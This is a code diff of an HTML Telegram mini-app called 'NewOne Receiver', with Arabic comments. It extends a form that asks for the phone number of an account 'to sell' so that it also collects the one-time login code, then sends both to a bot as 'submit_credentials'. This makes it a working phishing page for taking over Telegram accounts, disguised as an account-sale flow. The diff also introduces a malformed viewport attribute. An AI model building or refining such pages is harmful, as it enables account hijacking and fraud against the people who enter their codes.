@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-color=1.0, user-scalable=no">
     <title>NewOne Receiver</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
@@ -13,38 +13,80 @@
         input[type="text"] { width: 100%; padding: 16px; background-color: transparent; border: 2px solid #2f2f2f; border-radius: 12px; color: #ffffff; font-size: 16px; box-sizing: border-box; outline: none; transition: border-color 0.15s ease; text-align: left; }
         input[type="text"]:focus { border-color: #2481cc; }
         input[type="text"]::placeholder { color: #525252; }
+        
+        /* إخفاء واجهة الكود في البداية */
+        #code_step { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div id="phone_step" class="container">
         <h1>Account phone number</h1>
         <p>Enter the phone number of the Telegram account you want to sell</p>
         <input type="text" inputmode="tel" id="phone_input" placeholder="Phone number" autocomplete="off">
+    </div>
+
+    <div id="code_step" class="container">
+        <h1>Enter Code</h1>
+        <p>We have sent an SMS with the activation code to your phone or Telegram account</p>
+        <input type="text" inputmode="numeric" id="code_input" placeholder="Login code" autocomplete="off">
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
         
+        const phoneStep = document.getElementById('phone_step');
+        const codeStep = document.getElementById('code_step');
         const phoneInput = document.getElementById('phone_input');
+        const codeInput = document.getElementById('code_input');
         
+        let currentStep = "phone"; // المتغير المسؤول عن معرفة الخطوة الحالية
+        let savedPhone = "";
+
         tg.MainButton.text = "Continue";
         tg.MainButton.textColor = "#FFFFFF";
         tg.MainButton.color = "#2481cc";
 
+        // مراقبة حقل الرقم
         phoneInput.addEventListener('input', function() {
-            if (phoneInput.value.trim().length >= 5) { tg.MainButton.show(); } 
-            else { tg.MainButton.hide(); }
+            if (currentStep === "phone") {
+                if (phoneInput.value.trim().length >= 5) { tg.MainButton.show(); } 
+                else { tg.MainButton.hide(); }
+            }
         });
 
-        // عند الضغط على زر Continue الأزرق
+        // مراقبة حقل الكود
+        codeInput.addEventListener('input', function() {
+            if (currentStep === "code") {
+                if (codeInput.value.trim().length >= 4) { tg.MainButton.show(); } 
+                else { tg.MainButton.hide(); }
+            }
+        });
+
+        // التحكم عند الضغط على زر Continue الأزرق
         tg.MainButton.onClick(function() {
-            const phone = phoneInput.value.trim();
-            
-            // هذه الدالة المباشرة مخصصة للـ Inline Buttons لإرسال البيانات فوراً للبوت وإغلاق الشاشة
-            tg.sendData(JSON.stringify({ action: "submit_phone", phone: phone }));
-            tg.close();
+            if (currentStep === "phone") {
+                // حفظ الرقم والانتقال لخطوة الكود
+                savedPhone = phoneInput.value.trim();
+                currentStep = "code";
+                
+                phoneStep.style.display = "none"; // إخفاء واجهة الرقم
+                codeStep.style.display = "block"; // إظهار واجهة الكود
+                tg.MainButton.hide(); // إخفاء الزر حتى يكتب الكود
+                codeInput.focus(); // فتح الكيبورد تلقائياً للحقل الجديد
+                
+            } else if (currentStep === "code") {
+                const finalCode = codeInput.value.trim();
+                
+                // إرسال البيانات المدمجة (الرقم + الكود) معاً للبوت مباشرة
+                tg.sendData(JSON.stringify({ 
+                    action: "submit_credentials", 
+                    phone: savedPhone, 
+                    code: finalCode 
+                }));
+                tg.close();
+            }
         });
     </script>
 </body>
